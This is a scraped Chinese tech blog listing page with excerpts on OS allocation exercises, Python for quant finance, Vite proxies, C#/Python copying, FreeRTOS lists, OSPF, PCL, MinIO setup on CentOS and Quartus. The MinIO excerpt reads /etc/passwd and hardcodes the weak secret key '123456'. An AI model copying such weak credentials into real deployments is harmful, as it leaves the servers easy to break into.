输入格式 程序要求输入4行，以回车符号作为分隔，第一行是一个整数n（4&gt;n&gt;0），表示进程已经占用分区的数量；第二行是2n个整数，依次按地址递增对应第一行n个进程已经占用分区的起始地址和存储容量(单位为KB)。第三行是三个整数，表示进程申请的内存空间大小(存储容量单位为KB)；第四行是一个字符串，用”BEST”、 ”NEXT”、 ”WORST” （不含双引号，所有字母皆为大写）分别表示所选用的最佳适应、下次适应和最差适应分配算法。
输出格式 输出三个整数或字符串”false”（不含双引号，所有字母皆为小写），分别表示给进程所分配分区的起始地址；若某进程分配失败，则用”false”表示（不含双引号，所有字母皆为小写）。
输入样例 复制 1 50 100 20 20 80 BEST 输出样例 复制 0 20 150 #include &lt;stdio.h&gt; int num = 0; int idx = 0; int A[10] ={0}; int B[] ={0,0,0,0,0,0,0,0,0,0}; int space[3] ={0}; void best(int len) { int min = 1024; int minQuality = 1024; int isPos = 0; for (int i = 0; i &lt;= len; i++) { if (B[i] &lt; minQuality) { if((space[num] &lt;= B[i])==1){ min = i; minQuality = B[i]; isPos = 1; } } } isPos !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8316e6ba425d989c34de638b321bdd3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a7526545442888d27c21eb670ce7f30/" rel="bookmark">
			请教大神，为何现在金融量化很多都用python，而不用C#呢？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为python更好用啊！作为一个量化从业者，我将为大家揭秘python的独特之处
一、为什么要学Python？
见仁见智，相对C++、JAVA、C#而言，Python算是一门简单、易学的语言，关键是开发效率较高。 实现同样的功能，Python的代码可能只有C++语言的五分之一。
2023年Python使用率为12.46%，当前是冠军。
二、Python都能干啥？
1.人工智能
人工智能的爆发，成就了Python，让Python在机器学习、神经网络、深度学习等领域成为主流的编程语言，得到广泛的支持和应用。
2.云计算
云计算领域最火的语言，没有之一，开源云计算解决方案OpenStack就是基于Python开发的。
3.网络爬虫
网络爬虫又称网络蜘蛛，是指按照某种规则在网络上爬取所需内容的脚本程序。众所周知，每个网页通常包含其他网页的入口，网络爬虫则通过一个网址依次进入其他网址获取所需内容。
在爬虫领域，Python是必不可少的一部分。将网络一切数据作为资源，通过自动化程序进行有针对性的数据采集以及处理。
4.Web开发
通俗来讲，结合HTML、css、javascript、数据库可以做一个网站。开发框架有：Django、Tornado、Flask等。
5.科学运算
随着NumPy、SciPy、Matplotlib、pandas等典型库的推出，Python已经越来越适合于做科学计算、2D/3D图像绘制等任务。
Python已经越来越成为金融量化从业者必不可少的技能。即使你会其它编程语言，建议也学一下Python技能，学起来也很简单。
6.自动化运维
随着技术的进步、业务需求的快速增长，一个运维人员通常要管理上百、上千台服务器，运维工作也变得重复、繁杂。
把运维工作自动化，能够把运维人员从服务器的管理中解放出来，让运维工作变得简单、快速、准确。
三、Python在量化中的应用
就跟javascript在web领域无可撼动的地位一样，Python也已经在金融量化投资领域占据了重要位置，从各个业务链条都能找到相应的框架实现。
在量化投资(证券和比特币)开源项目里，全球star数排名前10位里面，有7个是Python实现的。从数据获取到策略回测再到交易，覆盖了整个业务链。而全球注册用户数最多的商业量化平台Uqer优矿，也同样是基于Python实现和提供服务的。国内后来的其他量化平台，例如ricequant和joinquant，也主推Python环境。可见Python在量化平台应用的绝对占有程度。
Python是数字华尔街上一颗冉冉升起的新星,Python非常适合开发分析工具和数量分析模型,这些分析工具和模型对于投资银行和对冲基金的交易策略来说至关重要。
四、Python的优点
1.简单易学
与C++语言相比，Python有更少的关键字、更简单的结构、更明确的语法， 学习起来也更加简单。Python的学习成本和难度曲线比其他编程语言低不少，更适合新手快速入门。
2.面向对象
Python是完全面向对象的语言，函数、模块、数字、字符串等一切都是对象，支持继承、重载、多重继承、重载运算符，也支持泛型设计。
3.跨平台、可移植
Python已经支持Windows、Linux、Mac等主流操作系统。基于其开放源代码的特性，Python可以很容易地移植到其他平台上。
4.可扩展
Python语言本身是由C语言编写而成的，你完全可以在Python中嵌入C或C++。 如果你需要一段运行很快的关键代码，或者想要编写一些不希望开放源码的算法，你可以使用C或C++实现那部分程序，然后在你的Python程序中调用。
5.强大的标准库
Python语言的核心只包含数字、字符串、列表、字典、文件等常见类型和函数，而Python标准库则提供了系统管理、网络通信、数据库接口、图形系统、文本处理、XML处理等强大的功能。
总结下来，Python因其简单、高效、丰富的生态系统和与其他语言的良好结合，对Python的学习已经上升到了国家战略的层面。各国教育部门已经开始将Python纳入其教育体系。
虽然python有这么多多优点，但是实际使用中也会存在一些相关的问题，大家可以了解一下
五、Python的缺点
1.运行速度慢
由于Python是解释型语言，与C、C++程序相比，运行速度会慢不少。Python代码在执行时，会逐行翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以会变慢。
2.代码加密困难
不像编译型语言的源代码会被编译成可执行程序，Python 是直接运行源代码，因此对源代码加密比较困难。
如果你对Python感兴趣，想要学习python，这里给大家分享一份Python全套学习资料，都是我自己学习时整理的，希望可以帮到你，一起加油！
😝有需要的小伙伴，可以点击下方链接免费领取或者V扫描下方二维码免费领取🆓
Python全套学习资料
1️⃣零基础入门 ① 学习路线 对于从来没有接触过Python的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
② 路线对应学习视频 还有很多适合0基础入门的学习视频，有了这些视频，轻轻松松上手Python~
③练习题 每节视频课后，都有对应的练习题哦，可以检验学习成果哈哈！
2️⃣国内外Python书籍、文档 ① 文档和书籍资料 3️⃣Python工具包+项目源码合集 ①Python工具包 学习Python常用的开发软件都在这里了！每个都有详细的安装教程，保证你可以安装成功哦！
②Python实战案例 光学理论是没用的，要学会跟着一起敲代码，动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。100+实战案例源码等你来拿！
③Python小游戏源码 如果觉得上面的实战案例有点枯燥，可以试试自己用Python编写小游戏，让你的学习过程中增添一点趣味！
4️⃣Python面试题 我们学会了Python之后，有了技能就可以出去找工作啦！下面这些面试题是都来自阿里、腾讯、字节等一线互联网大厂，并且有阿里大佬给出了权威的解答，刷完这一套面试资料相信大家都能找到满意的工作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a7526545442888d27c21eb670ce7f30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87290fa898cd36ae8ce08e57a87502e0/" rel="bookmark">
			vite配置proxy代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如下代码： "/cygl/api/cyfx" 和 "/cygl/api" 两个代理配置。
如果将"/cygl/api/cyfx"放到"/cygl/api"的下边，那么"/cygl/api/cyfx"代理将会失效。
因为他们的前置路径一样。会先行匹配掉/cygl/api 在进行下一个代理。这时候就只剩下cyfx了。是不会匹配成功的。
server: { https: false, proxy: { "/cygl/api/cyfx": { target: "http://127.0.0.1:8093", changeOrigin: true, // 允许跨域 rewrite: (path) =&gt; path.replace(/^\/cygl\/api\/cyfx/, ""), }, "/cygl/api": { // 配置需要代理的路径 --&gt; 这里的意思是代理http://localhost:80/api/后的所有路由 target: "http://127.0.0.1:8088", changeOrigin: true, // 允许跨域 ws: true, // 允许websocket代理 // 重写路径 --&gt; 作用与vue配置pathRewrite作用相同 rewrite: (path) =&gt; path.replace(/^\/cygl\/api/, ""), }, }, }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df1714ecc11bc45d6fcad6c50f6278bf/" rel="bookmark">
			Unity&amp;&amp;C#学习笔记-拆装箱,List,浅深拷贝,equals和==
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拆箱和装箱 例:Integer是一个封装类，用于表示整数。它是int的封装类，可以将int类型的数据转换为Integer类型的数据。Integer类提供了许多操作整数的方法，使得整数的操作更加方便和灵活。
int是基本数据类型，而Integer是int的封装类。
int类型的数据直接存储在内存中的栈中，而Integer类型的数据则存储在堆中的对象中。
装箱：
对值类型在堆中分配一个对象实例，并将该值复制到新的对象中。按三步进行。
1：首先从托管堆中为新生成的引用对象分配内存(大小为值类型实例大小加上一个方法表指针和一个SyncBlockIndex)。
2：然后将值类型的数据拷贝到刚刚分配的内存中。
3：返回托管堆中新分配对象的地址。这个地址就是一个指向对象的引用了。
可以看出，进行一次装箱要进行分配内存和拷贝数据这两项比较影响性能的操作。
拆箱：
1、首先获取托管堆中属于值类型那部分字段的地址，这一步是严格意义上的拆箱。
2、将地址的值拷贝到位于线程堆栈上的值类型实例中。
装箱比较耗费性能
ArrayList和List之间的区别以及相互转换方法 ArrayList:需要先将类型转变为Object,再将Object转换为其所对应的类型。有个先装箱，再拆箱的过程。
List:泛型中指定了类型，其不需要进行装箱拆箱，效率也就相对提升。
List和ArrayList的区别 1.list性能较高,ArrayList性能较低
2.list一次存储中只能存储泛型中的类型,ArrayList在一次存储中任何类型的数据
3.List中获取值取出的是泛型中发的类型,因为ArrayList对元素没有限制,系统会将中获取的值当object类型的数据
4.List属于泛型集合 ArrayList属于非泛型集合
如果想获取到其中的内容需要进行
List在使用时候需要导入的using指令为using System.Collections.Generic;
ArrayList在使用的时候需要导入的using指令为using System.Collections;
浅拷贝和深拷贝 浅拷贝： 仅仅把对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。此时，其中一个的成员对象的改变都会影响到另一个的成员对象。
深拷贝：指的是拷贝一个对象时，不仅仅把对象的引用进行拷贝，还把该对象引用的值也一起拷贝。这样进行深拷贝后的副本对象就和源对象互相独立，其中任何一个的成员对象改动都不会对另外一个成员对象造成影响。
都发生了改变,浅拷贝
//a.CopyTo(b, 1);//就是把b中的值拷贝给aArray，实现深拷贝。
b长度要大于a//index含义是b开始存储拷贝数据的下标
深拷贝
equals和== 对于值类型
在C#中对于值类型的比较不管是用【==】还是【equals】都是对于其内容的比较，也就是说对于其值的比较，相等则返回true 不相等则返回false；
对于引用类型
对于除string类型以外的引用类型
【==】比较的是在对象在栈上的引用是否相同而【equals】则比较的是对象在堆上的内容是否相同
对于字符串类型
//常量字符串
string x = "should it matter"; //指向同一个地址，即所谓的常量池
string y = "should it matter";
object c = x;
object d = y;
Console.WriteLine(c == d);//输出True
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df1714ecc11bc45d6fcad6c50f6278bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04da3da08268cacbfcb6d679518d7997/" rel="bookmark">
			湖北师范大学操作系统实验（java版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📑前言 本文主要是【操作系统】——操作系统实验题的文章，如果有什么需要改进的地方还请大佬指出⛺️
🎬作者简介：大家好，我是听风与他🥇
☁️博客首页：CSDN主页听风与他
🌄每日一句：狠狠沉淀，顶峰相见
目录 📑前言进程调度1—静态非剥夺式优先级调度计算平均作业周转时间参考代码 进程调度2--最高响应比优先计算每个作业的周转时间参考代码 并发进程的分类—利用BERSTEIN条件判断语句的无关性与交互性参考代码 死锁—利用银行家算法判断资源是否可以申请成功参考代码 存储管理—可变分区存储管理方式的最佳适应、下次适应、最差适应分配算法参考代码 存储管理—FIFO页面替换算法计算中断次数参考代码 带存储管理的处理器调度4参考代码 驱动调度—采用电梯调度算法排列出磁盘请求响应次序参考代码 📑文章末尾 进程调度1—静态非剥夺式优先级调度计算平均作业周转时间 问题描述：要求输入3个进程的信息，假设这些进程均是在0时刻同时到达，若进程调度采用非剥夺式静态优先级（优先数数值大的表示优先级比较高；如果遇到优先级一样，按照输入顺序执行。），计算并输出平均作业周转时间。
输入格式：程序要求输入3行，以回车符号作为分隔，每行有3个数据，以空格作为分隔。首先输入一个字符串（长度小于等于10），为进程名，第2个数据类型为整型，表示进程的优先数，第3个数据类型为整型，表示进程的运行时间。
输出格式：输出结果为一个浮点数，保留到小数点后一位，为系统的平均作业周转时间。
样例输入1：
P1 1 1
P2 2 2
P3 3 3
样例输出1：
4.7
样例输入2：
P1 10 10
P2 100 100
P3 100 100
样例输出2：
170.0
参考代码 import java.util.ArrayList; import java.util.Collections; import java.util.List; import java.util.Scanner; public class Main { /* P1 1 1 P2 2 2 P3 3 3 4.7 P1 10 10 P2 100 100 P3 100 100 170.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04da3da08268cacbfcb6d679518d7997/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc39b9c7c02995f2bc3b3c4af9f7d54b/" rel="bookmark">
			FreeRTOS列表和列表项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
列表和列表项
关于列表的一些操作
初始化列表
初始化列表项
列表插入列表项
列表项末尾插入
重点
pxIndex指向的是什么
xItemValue存的是什么
vListInsertEnd()的插入位置
List的头尾在哪里？
通用链表的三种实现方式
方法一
方法二
方法三
总结
FreeRTOS内核调度使用了大量的列表（list）和列表项（listitem）数据结构。它的源码中涉及到很多列表的操作，对于FreeRTOS来说，列表就是它最基础的一部分，列表被用作FreeRTOS调度器使用，用于跟踪任务，处于就绪，挂起，延时的任务都会被挂接到各自的列表中，用户程序如果有需要，也可以使用列表，其中就连FreeRTOS的任务调度其实核心也涉及到列表。
FreeRTOS列表使用指针指向列表项。一个列表（list）下面可能有很多个列表项（list item），每个列表项都有一个指针指向列表。如图所示
列表和列表项 列表项有两种形式，全功能版的列表项xLIST_ITEM和迷你版的列表项xMINI_LIST_ITEM。我们来看一下它们具体的定义，先看全功能版。
struct xLIST_ITEM { listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE /*用于检测列表项数据是否完整*/ configLIST_VOLATILE TickType_t xItemValue; /*列表项值*/ struct xLIST_ITEM * configLIST_VOLATILE pxNext; /*指向列表中下一个列表项*/ struct xLIST_ITEM * configLIST_VOLATILE pxPrevious; /*指向列表中上一个列表项*/ void * pvOwner; /*指向一个任务TCB*/ void * configLIST_VOLATILE pvContainer; /*指向包含该列表项的列表 */ listSECOND_LIST_ITEM_INTEGRITY_CHECK_VALUE /*用于检测列表项数据是否完整*/ }; typedef struct xLIST_ITEM ListItem_t; 宏listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE和listSECOND_LIST_ITEM_INTEGRITY_CHECK_VALUE用于检查列表项数据是否完整，在projdefs.h中，如果将宏configUSE_LIST_DATA_INTEGRITY_CHECK_BYTES设置为1，则使能列表项数据完整性检查，则宏listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE和listSECOND_LIST_ITEM_INTEGRITY_CHECK_VALUE会被两个已知的数值代替。
xItemValue是列表项值，通常是一个被跟踪的任务优先级或是一个调度事件的计数器值。如果任务因为等待从队列取数据而进入阻塞状态，则任务的事件列表项的列表项值保存任务优先级有关信息，状态列表项的列表项值保存阻塞时间有关的信息。这个变量被configLIST_VOLATILE修饰，configLIST_VOLATILE被映射成C语言关键字volatile，表明这个变量是“易变的”，告诉编译器不得对这个变量进行代码优化，因为列表项的成员可能会在中断服务程序中被更新。
pxNext和pxPrevious是列表项类型指针，用来指向列表中下一个和上一个列表项，通过这两个指针，列表项之间可以形成类似双向链表结构。
指针pvOwner通常指向一个任务TCB。
指针pvContainer指向包含该列表项的列表。
迷你版的列表项xMINI_LIST_ITEM是全功能版列表项xLIST_ITEM的一个子集，定义如下所示：
struct xMINI_LIST_ITEM { listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE /*用于检测列表项数据是否完整*/ configLIST_VOLATILE TickType_t xItemValue; struct xLIST_ITEM * configLIST_VOLATILE pxNext; struct xLIST_ITEM * configLIST_VOLATILE pxPrevious; }; typedef struct xMINI_LIST_ITEM MiniListItem_t; 既然有了全功能版的列表项，为什么还要声明迷你版的列表项呢？这是因为列表结构体需要一个列表项成员，但又不需要列表项中的所有字段，所以才有了迷你版列表项。迷你列表项起到的主要作用就是标识列表的末尾，所以它的值也设置成了最大值，列表结构体定义为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc39b9c7c02995f2bc3b3c4af9f7d54b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab999f5ee31b108381eae354391f86fa/" rel="bookmark">
			ensp ospf单区域、多区域基本配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单区域 单区域AR1的ospf配置：相关命令配置在网段
1.ospf 1 router-id &lt;x.x.x.x&gt;
2.area &lt;区域号&gt;（区域号相同的之间可以进行互通）
3.network &lt;相连区域网段&gt;
（进入接口并配置ip已省略）
*这里只配了AR1其他同上*
若
State：Full
则于相邻路由器交换信息
多区域 配置在接口
ospf 1 router-id x.x.x.x area &lt;区域号&gt;
inter &lt;例g0/0/0&gt;（进入相应接口）
ospf e 1 a &lt;接口所连接的区域号&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4543ed8a3042b9ef37b905b8d935692/" rel="bookmark">
			PCL计算点的法向量pcl::PointNormal，构造函数失败
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 PCL只获取点云中一个点的法向量之computePointNormal_pcl pointnormal_Hi_BelingBeling的博客-CSDN博客
//构造该点对应的法向量 pointNormal-&gt;push_back(pcl::PointNormal(searchPoint._PointXYZ::x, searchPoint._PointXYZ::y, searchPoint._PointXYZ::z,planeParams[0], planeParams[1], planeParams[2],curvature)); //将获取到的单个点的法向量添加到图中 viewer-&gt;addPointCloudNormals&lt;pcl::PointNormal&gt;(pointNormal); 但是会出错，我的环境是1.8.1跑起来失败了，原因是pcl::PointNormal()构造函数，pcl1.8.1不支持这种写法，pcl1.12的可以。
修改成pcl::_PointNormal可以解决问题
//或者是 pcl::PointNormal pointNormal; pointNormal.x = 1; pointNormal.y = 1; pointNormal.z = 1; pointNormal.normal_x = 1; pointNormal.normal_x = 1; pointNormal.normal_x = 1; pcl::_PointNormal a; a.x = searchPoint.x; a.y = searchPoint.y; a.z = searchPoint.z; a.normal_x = planeParams[0]; a.normal_y = planeParams[1]; a.normal_z = planeParams[2]; a.curvature = curvature; pointNormal-&gt;push_back(pcl::PointNormal(a)); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3b2b6bb078db9cb8f3b324bbe866ef4/" rel="bookmark">
			centos7 安装 Minio
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#1.下载二进制安装包 先创建一个存放的文件夹：/datadrive/user/local/minIO/bin
cd / mkdir datadrive cd datadrive mkdir user cd user mkdir local cd local mkdir minIO cd minIO mkdir bin 在这个目录下，然后直接下载，下载完后，直接给该文件变成可执行文件。
wget https://dl.minio.io/server/minio/release/linux-amd64/minio #2.给权限 在/datadrive/user/local/minIO/bin目录下，把minio这个文件移动到该目录，并赋予可执行权限。
chmod +x minio 执行后，变成了可执行文件
#4.创建用户组和创建用户 groupadd minio useradd minio -g minio 查看用户信息
cat /etc/passwd #5.创建minIO的配置文件 在/datadrive/user/local/minIO/目录下先创建etc文件夹
cd /datadrive/user/local/minIO/ mkdir etc cd etc vi minio.conf MINIO_VOLUMES="/datadrive/user/local/minIO/data" MINIO_OPTS="-C /datadrive/user/local/minIO/etc --address 192.168.1.103:9000" MINIO_ACCESS_KEY="root" MINIO_SECRET_KEY="123456" 注意这里的ip要改成你们自己的ip地址,这里的ip特别注意，需要内网ip,否则服务起不来。
同时设置用户名和密码
#6.创建一个minio.service服务 vim /etc/systemd/system/minio.service 内容是：
[Unit] Description=MinIO Documentation=https://docs.min.io Wants=network-online.target After=network-online.target AssertFileIsExecutable=/datadrive/user/local/minIO/bin/minio [Service] # User and group User=minio Group=minio EnvironmentFile=/datadrive/user/local/minIO/etc/minio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3b2b6bb078db9cb8f3b324bbe866ef4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0acdf59c9236aa9e217b7c9f480d093/" rel="bookmark">
			滚雪球学Java(09-8)：Java中的单目运算符，你真的掌握了吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		咦咦咦，各位小可爱，我是你们的好伙伴——bug菌，今天又来给大家普及Java SE相关知识点了，别躲起来啊，听我讲干货还不快点赞，赞多了我就有动力讲得更嗨啦！所以呀，养成先点赞后阅读的好习惯，别被干货淹没了哦~
🏆本文收录于「滚雪球学Java」专栏，专业攻坚指数级提升，助你一臂之力，带你早日登顶🚀，欢迎大家关注&amp;&amp;收藏！持续更新中，up！up！up！！
环境说明：Windows 10 + IntelliJ IDEA 2021.3.2 + Jdk 1.8 文章目录 前言摘要Java-单目运算符简介源代码解析递增和递减运算符正负号运算符逻辑非运算符 应用场景案例递增和递减运算符的应用正负号运算符的应用逻辑非运算符的应用 优缺点分析类代码方法介绍测试用例测试代码演示测试结果测试代码分析 全文小结 总结附录源码 ☀️建议/推荐你📣关于我 前言 Java是一门功能强大的编程语言，适用于各种类型的编程。在Java中，单目运算符是一种对单个操作数进行操作的运算符。本文将着重介绍Java中的单目运算符，并提供一些实用的案例应用。
摘要 本文主要介绍Java中的单目运算符，包括递增、递减、正负号、逻辑非等常用运算符。通过对这些运算符的深入了解，我们可以更好地理解Java中的运算符，从而更加熟练地使用Java进行编程。
Java-单目运算符 简介 在Java中，单目运算符是一种只操作一个操作数的运算符。Java中的单目运算符包括递增（++）、递减（–）、正负号（+、-）和逻辑非（!）等运算符。这些运算符可以用于不同的数据类型，包括整型、浮点型、布尔型等。
源代码解析 递增和递减运算符 递增和递减运算符用于对变量的值进行增加或减少操作。递增运算符（++）将变量的值加上1，递减运算符（–）将变量的值减去1。这两个运算符都可以前缀或后缀使用。
前缀使用时，递增和递减运算符先对变量进行计算，然后将计算后的值赋给变量。后缀使用时，则是先将变量的值赋给另一个变量，然后再对原变量进行计算。
int i = 0; int j = ++i;	// i=1, j=1 int k = i--;	// i=0, k=1 正负号运算符 正负号运算符（+、-）用于对变量的值进行正负号的操作。当加上正号（+）时，变量的值保持不变；当加上负号（-）时，变量的值变为相反数。
int i = 5; int j = -i;	// j = -5 逻辑非运算符 逻辑非运算符（!）用于对布尔型变量进行取反操作。如果布尔型变量的值为true，则取反后的值为false；如果布尔型变量的值为false，则取反后的值为true。
boolean b = true; boolean c = !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0acdf59c9236aa9e217b7c9f480d093/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81d322c6df6a6ed83eb4918605991223/" rel="bookmark">
			Python 提高篇学习笔记(一)：深拷贝和浅拷贝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、什么是对象的引用二、深拷贝和浅拷贝2.1 浅拷贝(Shallow Copy)2.2 深拷贝(Deep Copy)2.3 copy.copy和copy.deepcopy的区别 一、什么是对象的引用 在 Python 中，对象的引用是指变量指向内存中某个对象的地址或标识符。当你创建一个新的对象(比如一个整数、字符串、列表等)，Python 会分配一块内存来存储这个对象，并且给这个对象分配一个唯一的标识符(也就是对象的地址)。当你将这个对象赋值给一个变量时，实际上这个变量就存储了对该对象的引用，而不是对象本身。这意味着变量并不直接包含对象的值，而是指向存储这个值的内存地址。
举例：
In [19]: x = [1, 2, 3] # 创建一个列表对象，并将其引用赋给变量x In [20]: y = x # y和x现在指向同一个列表对象 In [21]: # 修改x所指向的列表对象 In [22]: x.append(4) In [23]: print(y) # 输出[1, 2, 3, 4]，因为y引用的是和x相同的列表对象 [1, 2, 3, 4] 在这个例子中，[1, 2, 3] 是一个列表对象，在内存中有自己的地址。x 这个变量包含了对这个列表对象的引用，而不是列表对象本身。如果你创建一个新的变量 y = x，那么 y 实际上也会指向同一个列表对象，即它们共享相同的引用。图示：
因此，对于可变对象(如列表、字典等)， 如果多个变量引用了同一个对象，当你通过一个变量修改这个对象时，其他引用了相同对象的变量也会反映出这个修改。这是因为它们引用的是同一个对象，而不是对象的副本。对于不可变对象(如整数、字符串等)， 由于对象本身是不可变的，任何修改都会导致新对象的创建，而不会影响原始对象，因为对不可变对象的修改实际上是创建了一个新对象并将变量重新指向新对象的地址。举例：
In [33]: x = 300 In [34]: y = x In [35]: y = 400 In [36]: print(x, y) 300 400 图示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81d322c6df6a6ed83eb4918605991223/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/827135599afd459be36c29cff300cb6c/" rel="bookmark">
			解决：ERROR org.springframework.boot.SpringApplication - Application run failedorg.yaml.snakey
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在启动项目的时候报下面错误导致服务启动失败，详细报错信息如下：
21:10:56.676 [main] ERROR org.springframework.boot.SpringApplication - Application run failed
org.yaml.snakeyaml.scanner.ScannerException: mapping values are not allowed here
in 'reader', line 14, column 24:
driver-class-name: com.mysql.cj.jdbc.Driver
^
at org.yaml.snakeyaml.scanner.ScannerImpl.fetchValue(ScannerImpl.java:890)
at org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:379)
at org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:248)
at org.yaml.snakeyaml.parser.ParserImpl$ParseBlockMappingKey.produce(ParserImpl.java:602)
at org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:165)
at org.yaml.snakeyaml.comments.CommentEventsCollector$1.peek(CommentEventsCollector.java:59)
at org.yaml.snakeyaml.comments.CommentEventsCollector$1.peek(CommentEventsCollector.java:45)
at org.yaml.snakeyaml.comments.CommentEventsCollector.collectEvents(CommentEventsCollector.java:140)
at org.yaml.snakeyaml.comments.CommentEventsCollector.collectEvents(CommentEventsCollector.java:119)
at org.yaml.snakeyaml.composer.Composer.composeScalarNode(Composer.java:221)
at org.yaml.snakeyaml.composer.Composer.composeNode(Composer.java:191)
at org.yaml.snakeyaml.composer.Composer.composeValueNode(Composer.java:313)
at org.yaml.snakeyaml.composer.Composer.composeMappingChildren(Composer.java:304)
at org.yaml.snakeyaml.composer.Composer.composeMappingNode(Composer.java:288)
at org.yaml.snakeyaml.composer.Composer.composeNode(Composer.java:195)
at org.yaml.snakeyaml.composer.Composer.composeValueNode(Composer.java:313)
at org.yaml.snakeyaml.composer.Composer.composeMappingChildren(Composer.java:304)
at org.yaml.snakeyaml.composer.Composer.composeMappingNode(Composer.java:288)
at org.yaml.snakeyaml.composer.Composer.composeNode(Composer.java:195)
at org.yaml.snakeyaml.composer.Composer.composeValueNode(Composer.java:313)
at org.yaml.snakeyaml.composer.Composer.composeMappingChildren(Composer.java:304)
at org.yaml.snakeyaml.composer.Composer.composeMappingNode(Composer.java:288)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/827135599afd459be36c29cff300cb6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b07a013cdaaf66f677b5591a2c1f17f/" rel="bookmark">
			Quartus Primer22.1下载安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考视频：
Quartus FPGA下载_哔哩哔哩_bilibili
Intel Altera FPGA Quartus Prime 17.0 安装_哔哩哔哩_bilibili
注意：上述视频，前后略有差别，第一个视频下载的Starter，第二个视频用的LTE。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cc649e24eb8e589b9fd7995368aa92e/" rel="bookmark">
			QuartusII学习使用（1）-创建新工程以非门为例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 双击打开软件 2 新建工程 2.1 创建文件夹 在创建工程前先创建一个文件夹以存放后续QuartusII工程，文件夹名字只能包含字母、数字和下划线，不能包含中文和其他符号。如下图所示，我将项目文件存储在F盘，读者可自行更改。0template为工程名称，doc文件夹存放与工程相关的解释文档等（方便其他人了解此工程），par文件夹存放Quartus软件的工程文件，rtl文件夹存放原代码，sim文件夹存放项目的仿真文件。
2.2 新建工程 双击图标后，点击左上角file&gt;New Progect Wizard或直接点击Starting Desigining界面中New Progect Wizard新建工程。
出现新建工程向导。
根据实际情况选择开发板型号。（没有开发板可先随便选一个）
此处未选择用任何仿真工具。
3 设计输入-编写代码 如下图所示，新建verilog设计文件，或者点击File&gt;new。
编写非门代码
//module
module not_gate(
input A,
output wire Y
);
//main code
assign Y=~A;
//end of RTL code
endmodule
点击保存文件File&gt;save，或者直接点击保存图标
在工程项目导航窗口中可看到文件
4 配置管脚 点击Assignments&gt;Device
5 分析综合（编译） 选择部分编译即可
编译成功界面
6 修改工程配置 一般是修改开发板或者加入仿真工具Modelsim或者添加文件
7 查看RTL（Register Transfer Level，寄存器传输级） 仿真结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea7c96595a9c79f8dea3c7e13a1781c2/" rel="bookmark">
			Quartus&#43;ModelSim——手动仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 新建文件夹存放仿真文件 2 打开ModelSim 双击图标
打开如下界面
